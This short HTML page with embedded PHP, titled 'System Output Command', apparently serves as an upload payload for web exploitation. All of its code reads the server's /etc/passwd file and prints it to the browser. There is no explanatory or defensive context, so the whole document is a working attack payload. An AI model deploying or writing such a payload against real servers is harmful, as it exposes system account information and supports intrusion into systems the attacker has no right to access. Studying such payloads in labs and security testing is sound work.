<!DOCTYPE html>
<html>
  <body>
    <h1>System Output Command: </h1>
    <?php
        echo "<pre>" . file_get_contents('/etc/passwd') . "</pre>";
    ?>
  </body>
</html>

